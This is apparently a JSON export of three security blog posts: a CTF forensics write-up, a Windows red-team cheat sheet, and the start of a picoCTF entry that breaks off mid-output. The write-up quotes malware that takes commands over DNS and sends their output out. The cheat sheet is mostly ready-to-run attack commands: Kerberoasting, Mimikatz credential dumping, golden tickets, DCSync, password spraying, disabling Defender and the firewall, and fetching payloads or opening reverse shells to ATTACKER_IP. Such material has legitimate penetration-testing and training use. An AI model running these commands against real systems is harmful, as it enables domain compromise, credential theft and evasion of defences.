[{"id":"e654344e9b34dd2b6c6880eb70864ae0","title":"CyberApocalypseCTF2022 - Forensics","content":"Challenges solved in the field of forensics in the Cyber Apocalypse CTF 2022 competition.\n\nPuppeteer\nGolden Persistence\nAutomation\n\nPuppeteerThe participant is provided with a set of logs for the Windows operating system, which they need to analyze in order to obtain the flag.\nFiles with the “evtx” extension can be edited using the Event Viewer tool in Windows.\nPowerShell script event logs are stored in “Microsoft-Windows-PowerShell Operational.evtx”.\n\nIn one of the reports, I came across a script that stored some interesting values in the variables:\n\nThere was an interesting comment in the scriptIt says “Unpack Special Orders!” I assumed that a significant amount was stored in the $stage3 variable.\nIn the first step, I removed the additional code related to “Unpack Shellcode”In the next step, I concluded that the $stage3 variable stores an array of ascii code that can be converted to a string using “[System.Text.Encoding] :: ASCII.GetString”.\n[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;\n[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;\n\n[array]::Reverse($stage2);\n\n$stage3 = $stage1 + $stage2;\n\n#Unpack Special Orders!\n\nfor($i=0;$i -lt $stage3.count;$i++)&#123;\n    $stage3[$i] = $stage3[$i] -bxor 0xd1;\n&#125;\n\n[System.Text.Encoding]::ASCII.GetString($stage3)\n\n#HTB&#123;b3wh4r3_0f_th3_b00t5_0f_just1c3...&#125;\n\nGolden PersistenceThere is a file called “NTUSER.DAT” in this challenge, which indicates that it is an “MS Windows registry file”\n\n\n\n\n\n\n\n\n\n$ file .&#x2F;NTUSER.DAT\nNTUSER.DAT: MS Windows registry file, NT&#x2F;2000 or above\n\n\n\n\n\n\nTIP\nMicrosoft Windows NT 4 (and later) uses the Windows NT Registry File (REGF) to store system and application related data, e.g. configurations, most recently used (MRU) files.\n\nUsing a tool called “accessdata registry viewer”, I checked and edited this file.\n\nThere were no results from my reviews,The tool allows the user to export all the information in text form, which I used to check all the text:\n\nAfter checking the output file, I realized this partA PowerShell script appears to be running as base64:\n\nFirst I saved the encoded script in a variable in PowerShell\n\nThen I decoded it with the command “[System.Text.Encoding] :: ASCII.GetString ([System.Convert] :: FromBase64String ($ script))”\n\nExamining the script, I noticed that the program decrypts the values by taking values from the register using the key in the code.\n\nI collected the values according to each of the paths in the code, for example the value of the first path is like this\n\n\n\n\n\n\n\n\n\n$encrypted1 &#x3D; (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL\n\nkey: HKCU:\\SOFTWARE\\ZYb78P4s\\t3RBka5tL\n\nvalue :F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\n\nAfter collecting all the values of the final code is as follows\n$enc = [System.Text.Encoding]::ASCII\n\nfunction encr &#123;\n    param(\n        [Byte[]]$data,\n        [Byte[]]$key\n      )\n\n    [Byte[]]$buffer = New-Object Byte[] $data.Length\n    $data.CopyTo($buffer, 0)\n\n    [Byte[]]$s = New-Object Byte[] 256;\n    [Byte[]]$k = New-Object Byte[] 256;\n\n    for ($i = 0; $i -lt 256; $i++)\n    &#123;\n        $s[$i] = [Byte]$i;\n        $k[$i] = $key[$i % $key.Length];\n    &#125;\n\n    $j = 0;\n    for ($i = 0; $i -lt 256; $i++)\n    &#123;\n        $j = ($j + $s[$i] + $k[$i]) % 256;\n        $temp = $s[$i];\n        $s[$i] = $s[$j];\n        $s[$j] = $temp;\n    &#125;\n\n    $i = $j = 0;\n    for ($x = 0; $x -lt $buffer.Length; $x++)\n    &#123;\n        $i = ($i + 1) % 256;\n        $j = ($j + $s[$i]) % 256;\n        $temp = $s[$i];\n        $s[$i] = $s[$j];\n        $s[$j] = $temp;\n        [int]$t = ($s[$i] + $s[$j]) % 256;\n        $buffer[$x] = $buffer[$x] -bxor $s[$t];\n    &#125;\n\n    return $buffer\n&#125;\n\n\nfunction HexToBin &#123;\n    param(\n    [Parameter(\n        Position=0,\n        Mandatory=$true,\n        ValueFromPipeline=$true)\n    ]\n    [string]$s)\n    $return = @()\n\n    for ($i = 0; $i -lt $s.Length ; $i += 2)\n    &#123;\n        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)\n    &#125;\n\n    Write-Output $return\n&#125;\n\n[Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\");\n$encrypted1 = \"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\"\n$encrypted2 = \"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\"\n$encrypted3 = \"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\"\n$encrypted4 = \"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\"\n$encrypted5 = \"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\"\n$encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\"\n\n[Byte[]]$data = HexToBin $encrypted\n$DecryptedBytes = encr $data $key\n$DecryptedString = $enc.GetString($DecryptedBytes)\n$DecryptedString\n\n#HTB&#123;g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh&#125;\n\nAutomationIn this challenge, a file captured with wireshark is given that you should check.\nFirst, I filtered the packets according to the http protocol\n\nI noticed that an image was downloaded but when I dumped the image I noticed that it was an encoded string with base64\n\nIf we decode the string with base64, we get a PowerShell script\n\nAfter checking the code, I found out that she received a series of commands using the dns query from the “windowsliveupdater.com” domain\n$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;\n\nThe received information had several sections that were decrypted with a key in the script\n$encryptedString = $out[$num].Strings[0]\n$backToPlainText = Decrypt-String $key $encryptedString\n\nAfter decrypted, execute the received command and save the output in encrypted form in output variable.\n$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32\n\nCommands are divided into 32 sections. And queries each section as a subdomain\nfor ($ans = 0; $ans -lt $pr.length-1; $ans++)&#123;\n\t$domain = -join($pr[$ans],\".windowsliveupdater.com\")\n\tResolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189\n&#125;\n\nTo specify the start and end of each command, first send a request to “start.windowsliveupdater.com” and finally a request to “end.windowsliveupdater.com”\nResolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189\nfor ($ans = 0; $ans -lt $pr.length-1; $ans++)&#123;\n\t$domain = -join($pr[$ans],\".windowsliveupdater.com\")\n\tResolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189\n&#125;\nResolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189\n&#125;\n\n\nAfter collecting all the parts of each command, the final script is as follows\nfunction Create-AesManagedObject($key, $IV) &#123;\n    $aesManaged = New-Object \"System.Security.Cryptography.AesManaged\"\n    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n    $aesManaged.BlockSize = 128\n    $aesManaged.KeySize = 256\n    if ($IV) &#123;\n        if ($IV.getType().Name -eq \"String\") &#123;\n            $aesManaged.IV = [System.Convert]::FromBase64String($IV)\n     \n        &#125;\n        else &#123;\n            $aesManaged.IV = $IV\n     \n\n        &#125;\n    &#125;\n    if ($key) &#123;\n\n        if ($key.getType().Name -eq \"String\") &#123;\n            $aesManaged.Key = [System.Convert]::FromBase64String($key)\n        &#125;\n        else &#123;\n            $aesManaged.Key = $key\n        &#125;\n    &#125;\n    $aesManaged\n&#125;\n\nfunction Create-AesKey() &#123;\n  \n    $aesManaged = Create-AesManagedObject $key $IV\n    [System.Convert]::ToBase64String($aesManaged.Key)\n&#125;\n\nfunction Encrypt-String($key, $unencryptedString) &#123;\n    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)\n    $aesManaged = Create-AesManagedObject $key\n    $encryptor = $aesManaged.CreateEncryptor()\n    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);\n    [byte[]] $fullData = $aesManaged.IV + $encryptedData\n    $aesManaged.Dispose()\n    [System.BitConverter]::ToString($fullData).replace(\"-\",\"\")\n&#125;\n\nfunction Decrypt-String($key, $encryptedStringWithIV) &#123;\n\t$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)\n    $IV = $bytes[0..15]\n    $aesManaged = Create-AesManagedObject $key $IV\n    $decryptor = $aesManaged.CreateDecryptor();\n    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);\n    $aesManaged.Dispose()\n    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)\n&#125;\n\nfilter parts($query) &#123; $t = $_; 0..[math]::floor($t.length / $query) | % &#123; $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) &#125;&#125; \n$key = \"a1E4MUtycWswTmtrMHdqdg==\"\n\nwrite-Output \"Command :\"\n#windowsliveupdater.com\n$command = @(\n\t\"Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=\",\n\t\"hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=\",\n\t\"58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=\",\n\t\"eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru\",\n\t\"BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=\",\n\t\"vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=\"\n)\n\nforeach($cmd in $command)&#123;\n\tDecrypt-String $key $cmd\n\twrite-host \"****\"\n&#125;\n\nwrite-host \"command Output :\"\n$commandOutput = @(\n\t\"CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB\",\n\t\"7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3\",\n\t\"09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4\",\n\t\"ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B\",\n\t\"841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524\",\n\t\"AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833\"\n)\n\nforeach($cmd in $commandOutput)&#123;\n\t\t$Bytes = [byte[]]::new($cmd.Length / 2)\n\t\tFor($i=0; $i -lt $cmd.Length; $i+=2)&#123;\n\t\t\t$Bytes[$i/2] = [convert]::ToByte($cmd.Substring($i, 2), 16)\n\t\t&#125;\n    $backToPlainText = Decrypt-String $key $([Convert]::ToBase64String($Bytes))\n\t\t$backToPlainText \n\t\twrite-host \"****\"\n&#125;\n\n# net user DefaultUsr \"JHBhcnQxPSdIVEJ7eTB1X2M0bl8n\" /add > $part1='HTB&#123;y0u_c4n_'\n# displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de&#125;\n\n#HTB&#123;y0u_c4n_4utom4t3_but_y0u_c4nt_h1de&#125;\n\nPOC\n\n\nname\ngist\n\n\n\nPuppeteer\nCyberApocalypseCTF2022 Puppeteer.ps1\n\n\nGolden Persistence\nCyberApocalypseCTF2022 GoldenPersistence.ps1\n\n\nAutomation\nCyberApocalypseCTF2022 Automation.ps1\n\n\n","slug":"CyberApocalypseCTF2022-Forensics","date":"2022-06-09T12:22:47.000Z","categories_index":"CTF,Security","tags_index":"Voynich,CTF-Team,CTF","author_index":"HSNHK"},{"id":"4da614f2089b6628415f50fed745da80","title":"Windows Red Team Cheat Sheet","content":"List of tools and techniques required by the red team.\n\n\n\n\n\n\nTIP\nThe contents of this post have been collected from various books and repositories.\n\nReconnaissancesystem information\n\n\nCommand\nDescriptions\n\n\n\nsysteminfo\nThis tool displays operating system configuration information for a local or remote machine, including service pack levels.\n\n\nhostname\nPrints the name of the current host.\n\n\nAccountsnet users\nnet localgroups\nnet localgroup Administrators\nnet user &lt;USERNAME>\n\n# Crosscheck local and domain too\nnet user &lt;USERNAME> /domain\nnet group Administrators /domain\n\n\nNetwork informationipconfig /all\nroute print\narp -A\n\n# Network connections\nnetstat -ano\n\nProcesses And Services# Running processes\ntasklist /SVC\n\nsc query state= all | findstr \"SERVICE_NAME:\" >> a &amp; FOR /F \"tokens=2 delims= \" %i in (a) DO @echo %i >> b &amp; FOR /F %i in (b) DO @(@echo %i &amp; @echo --------- &amp; @sc qc %i | findstr \"BINARY_PATH_NAME\" &amp; @echo.) &amp; del a 2>nul &amp; del b 2>nul\n\nPrivileges EscalationPowerShellMafia\ngithub repository\n\npowershell.exe -c \"Import-Module C:\\Users\\Public\\PowerUp.ps1; Invoke-AllChecks\"\npowershell.exe -c \"Import-Module C:\\Users\\Public\\Get-System.ps1; Get-System\"\n\nUnquoted pathswmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v\n\nJuicy PotatoC:\\Windows\\Temp\\JuicyPotato.exe -p cmd.exe -a \"/c whoami > C:\\Users\\Public\\whoami.txt\" -t * -l 1031 -c &#123;d20a3293-3341-4ae8-9aaf-8e397cb63c34&#125;\n\nKerberoast# Rubeus \n.\\.rubeus.exe kerberoast /creduser:ecorp\\hsnhk /credpassword:pass1234\n\n# List available tickets\nsetspn.exe -t evil.corp -q */*\npowershell.exe -exec bypass -c \"Import-Module .\\GetUserSPNs.ps1\"\ncscript.exe GetUserSPNs.ps1\n\n# List cached tickets\nInvoke-Mimikatz -Command '\"kerberos::list\"'\npowershell.exe -c \"klist\"\npowershell.exe -c \"Import-Module C:\\Users\\Public\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '\"kerberos::list\"'\"\n\n# Request tickets \nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/web01.medin.local\"\n\n# Requesting remotely\npython GetUserSPNs.py -request ECORP/hsnhk:supersecurepassword@127.0.0.1\n\n# Extract tickets\npowershell.exe -c \"Import-Module C:\\Users\\Public\\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat\"\nInvoke-Mimikatz -Command '\"kerberos::list /export\"'\n\n# Crack Tickets\npython tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi\n\nStored Credential# To check if there is any stored keyscmdkey /list\n\n# Using them\nrunas /user:administrator /savecred \"cmd.exe /k whoami\"\n\nImpersonating Tokens with meterpreteruse incognito\nlist_tokens -u\nimpersonate_token NT-AUTHORITY\\System\n\nTools\n\n\nCommand\nDescriptions\n\n\n\nPowerSploit\nPowerSploit - A PowerShell Post-Exploitation Framework\n\n\nSherlock\nPowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.\n\n\nJuicy Potato\nA sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM.\n\n\nRubeus\nRubeus is a C# toolset for raw Kerberos interaction and abuses.\n\n\nMimikatz\nmimikatz is a tool I’ve made to learn C and make somes experiments with Windows security.\n\n\nLateral MovementMimikatz Ticket PTHEnable-PSRemoting\nmimikatz.exe '\" kerberos:ptt C:\\Users\\Public\\ticketname.kirbi\"' \"exit\"\nEnter-PSSession -ComputerName ECORP\n\nInvoke-Mimikatz -Command '\"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command\"'\n\nWinRM$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\\hsnhk', $pass)\nInvoke-Command -ComputerName DC -Credential $cred -ScriptBlock &#123; whoami &#125;\n\n# Evil-WinRM\nruby evil-winrm.rb -i 192.168.1.2 -u hsnhk -p hsnhk -r evil.corp\n\nTools\n\n\nCommand\nDescriptions\n\n\n\nEvil-WinRM\nThis program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it.\n\n\nDatabase Links# PowerUpSQL\nhttps://github.com/NetSPI/PowerUpSQL\n\nGet-SQLServerLink -Instance server -Verbose\npowershell.exe -c \"Import-Module C:\\Users\\Public\\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\\sql\"\n\n# To see servers \nselect srvname from master..sysservers;\n\n# Native\nGet-SQLServerLinkCrawl -Instance server -Query \"exec master..xp_cmdshell 'whoami'\"\n\n# Linked database tables\nselect * from openquery(\"ECORP\\FOO\", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES') \n\n# You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler\n# With meterpreter module you can find linked databases and if you are admin on them\n\n# You can do a query and try to enable xp_cmpshell on that server\nselect * from openquery(\"server\",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"server\"\n\nGolden and Silver Tickets# Golden Ticket\n# Extract the hash of the krbtgt user\nlsadump::dcsync /domain:evil.corp /user:krbtgt\nlsadump::lsa /inject\nlsadump:::lsa /patch\nlsadump::trust /patch\n\n# creating the ticket \n# /rc4 or /krbtgt - the NTLM hash\n# /sid you will get this from krbtgt dump\n# /ticket parameter is optional but default is ticket.kirbi\n# /groups parameter is optional but default is 513,512,520,518,519\n# /id you can fake users and supply valid Administrator id \n\nkerberos::golden /user:hsnhk /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519 \nkerberos::ptt golden.tck # you can also add /ptt at the kerberos::golden command\n# After this , final ticket must be ready\n\n# You can now verify that your ticket is in your cache \npowershell.exe -c \"klist\"\n# Verify that golden ticket is working\ndir \\\\DC\\C$\npsexec.exe \\\\DC cmd.exe\n\n# Purge the currently cached kerberos ticket\nkerberos::purge \n\n#metasploit module can also be used for golden ticket, it loads the ticket into given session\npost/windows/escalate/golden_ticket \n\n# Silver Ticket\n# Silver Ticket allows escalation of privileges on DC\n# /target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)\n# /service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)\n\n# Examples\nkerberos::golden /user:hsnhk /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103\nsqlcmd -S evilcorp-sql102.evilcorp.local\nselect SYSTEM_USER;\nGO\n\nkerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\n\nAD AttacksEnumerationenum4linux -a 192.168.1.2\npython windapsearch.py -u hsnhk -p hsnhk -d evil.corp --dc-ip 192.168.1.2\npython ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd\n\nBruteforce on ldapImport-Module .\\DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n\n# Password brute\n./kerbrute_linux_amd64 bruteuser -d evil.corp --dc 192.168.1.2 rockyou.txt hsnhk\n\n# Username brute\n./kerbrute_linux_amd64 userenum -d evil.corp --dc 192.168.1.2 users.txt\n\n# Password spray\n./kerbrute_linux_amd64 passwordspray -d evil.corp --dc 192.168.1.2 users.txt rockyou.txt\n\nDC Shadow#Find sid for that user\nwmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid\n\n#This will create a RPC Server and listen\nlsadump::dcshadow /object:\"CN=hsnhk,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local\" /attribute:sidhistory /value:sid\n\n# Run this from another mimikatz\nlsadump::dcshadow /push\n\n# After this unregistration must be done\n# Relogin\n\nlsadump::dcsync /domain:ECORP.local /account:krbtgt\n\nDC Sync#####\nlsadump::dcsync /domain:domain /all /csv\nlsadump::dcsync /user:krbtgt\n\n#####\nhttps://gist.github.com/monoxgas/9d238accd969550136db\npowershell.exe -c \"Import-Module .\\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat\"\n\n#####\npython secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1\npython secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL\n\nTools\n\n\nCommand\nDescriptions\n\n\n\nenum4linux \nenum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts\n\n\nwindapsearch\nPython script to enumerate users, groups and computers from a Windows domain through LDAP queries\n\n\nad-ldap-enum\nAn LDAP based Active Directory user and group enumeration tool\n\n\nDomainPasswordSpray\nDomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.\n\n\nKerbrute\nA tool to perform Kerberos pre-auth bruteforcing\n\n\nsecretsdump.py\nPerforms various techniques to dump hashes from the remote machine without executing any agent there.\n\n\nBypass-Evasion TechniquesWindows Defendersc config WinDefend start= disabled\nsc stop WinDefend\n# Powershell\nSet-MpPreference -DisableRealtimeMonitoring $true\n# Remove definitions\n\"%Program Files%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n\nFirewallNetsh Advfirewall show allprofiles\nNetSh Advfirewall set allprofiles state off\n\nIp WhitelistingNew-NetFirewallRule -Name hsnhkinbound -DisplayName hsnhkinbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP\n\nApplocker ByPass\nReferences\nGeneric AppLocker bypasses\nVerified AppLocker Bypasses \nDLL Execution\n\n\n\n# Multistep process to bypass applocker via MSBuild.exe:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i  > out.cs \n\n# Replace the buf-sc and save it as out.csproj\nhttps://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml\n\nInvoke-WebRequest \"http://ATTACKER_IP/payload.csproj\" -OutFile \"out.csproj\"; C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe .\\out.csproj\n\n# or you can simply use my tool :)\nhttps://github.com/hsnhk/Msbuild-payload-generator\nsudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.220.130 --lport 9001 -m\n\nGreatSCT# This also needs Veil-Framework\npython GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c \"OBFUSCATION=ascii SCRIPT=/root/script.ps1\"\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe\n\npython3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U payload.dll\n\nEvilSalsa#Preparing payloads\npython EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt\nEncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt\n\n#Executing payload\nSalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP 9001\n\n# Reverse icmp shell\npython icmpsh_m.py \"ATTACKER_IP\" \"VICTIM_IP\"\nSalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP\n\nTools\n\n\nCommand\nDescriptions\n\n\n\nGreatSCT\nThe project is called Great SCT (Great Scott). Great SCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team.\n\n\nPost exploitationReading Event Logset-WinEvent -ListLog *\n\n# Listing logs of a specific user\n$cred = Get-Credentials\nGet -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred\n\n# Reading Security logs\n(Get-WinEvent -FilterHashtable @&#123;LogName = 'Security'&#125; | Select-Object @&#123;name='NewProcessNam\ne';expression=&#123; $_.Properties[5].Value &#125;&#125;, @&#123;name='CommandLine';expression=&#123;\n$_.Properties[8].Value &#125;&#125;).commandline\n\nPassword Dump# Metasploit\npost/windows/gather/enum_chrome\npost/multi/gather/firefox_creds\npost/firefox/gather/cookies\npost/firefox/gather/passwords\npost/windows/gather/forensics/browser_history\npost/windows/gather/enum_putty_saved_sessions\n\n# Empire\ncollection/ChromeDump\ncollection/FoxDump\ncollection/netripper\ncredentials/sessiongopher\n\n# mimikatz\nprivilege::debug\nsekurlsa::logonpasswords\n\nShadow copydiskshadow.exe\nset context persistent nowriters\nadd volume C: alias hsnhk\ncreate\nexpose %hsnhk% Z:\n\n# Deletion\ndelete shadows volume %hsnhk%\nreset\n\nNTDS.dit dumpsecretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local\n\npython crackmapexec.py 192.168.1.56 -u hsnhk -p pass1234 -d evilcorp.com --ntds drsuapi\n\n# on DC, lsass.exe can dump hashes\nlsadump::lsa /inject\n\nTools\n\n\nCommand\nDescriptions\n\n\n\nsecretsdump.py\nPerforms various techniques to dump hashes from the remote machine without executing any agent there.\n\n\nCrackMapExec\nA swiss army knife for pentesting networks\n\n\n","slug":"WinRedTeamCheatSheet","date":"2022-04-20T08:21:13.000Z","categories_index":"RedTeam,Security","tags_index":"Security,RedTeam","author_index":"HSNHK"},{"id":"bc15a35120add49422efba8f0a8eb06b","title":"picoCTF 2022","content":"picoCTF is the largest cybersecurity hacking competition for middle and high school students. Participants 13 years and older of all skill levels are encouraged to compete. Competitors must reverse-engineer, break, hack, decrypt, and think creatively and critically to solve the challenges and capture the digital flags.\nCTF Time\nForensicsSt3g0 zsteg -a -v ./pico.flag.png | grep picoCTF\nb1,rgb,lsb,xy       .. text: &quot;picoCTF&#123;7h3r3_15_n0_5p00n_1b8d71db&#125;$t3g0&quot;\n    00000000: 70 69 63 6f 43 54 46 7b  37 68 33 72 33 5f 31 